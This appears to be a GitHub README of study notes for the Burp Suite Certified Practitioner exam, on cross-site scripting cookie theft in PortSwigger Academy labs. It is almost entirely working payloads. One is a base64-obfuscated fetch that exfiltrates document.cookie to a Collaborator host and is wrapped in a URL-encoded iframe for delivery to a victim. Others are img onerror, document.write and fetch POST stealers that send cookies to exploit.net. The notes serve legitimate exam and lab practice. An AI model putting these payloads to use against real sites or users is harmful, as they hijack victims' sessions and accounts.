
# Burp-Suite-Certified-Practitioner-Exam-Study
PortSwigger Academy - Burp Suite Certified Practitioner Exam Study Notes

## Cross Site Scripting

+ [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)  

### Cookie Stealers

#### Reflected XSS in Search
Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload
<sub>WAF is preventing dangerous search filters and tags!</sub>
```JavaScript
fetch("https://Collaborator.oastify.com/?c=" + btoa(document['cookie']))
```
<sup>Base64 encode the payload</sup>
```
ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk=
```
<sub>Test payload on our own session in Search</sub>
```JavaScript
"+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```
![This image show after entering the above into search and the collaborator receiving request with base64 cookie value from us.](xss1.png)
<sup>Hosting in **IFRAME** on exploit server</sup>
```html
<iframe src="https://TARGET.web-security-academy.net/?SearchTerm=%22%2b%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%49%6d%68%30%64%48%42%7a%4f%69%38%76%4f%44%4d%35%59%32%74%30%64%54%64%31%62%32%64%6c%5a%47%30%32%59%54%46%72%61%6e%56%35%4d%32%39%31%64%47%78%36%59%32%34%79%59%6e%49%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%4d%39%49%69%41%72%49%47%4a%30%62%32%45%6f%5a%47%39%6a%64%57%31%6c%62%6e%52%62%4a%32%4e%76%62%32%74%70%5a%53%64%64%4b%53%6b%3d%22%29%29%7d%2f%2f"/>
```
![(Deliver reflected xss to steal victim cookie.](deliver-reflected-xss-to-steal-victim-cookie.png)

URL and Base64 online encoders and decoders
[URL Decode and Encode](https://www.urldecoder.org/)
[BASE64 Decode and Encode](https://www.base64encode.org/)  

#### Blog post comment section
```html
<img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
```  

#### Product and Store lookup
```html
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.net/?'+document.cookie;>
```  

#### Stored XSS Blog post
```JavaScript
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
```  

#### Fetch API Cookie Stealer in blog comment
```JavaScript
<script>
fetch('https://exploit.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
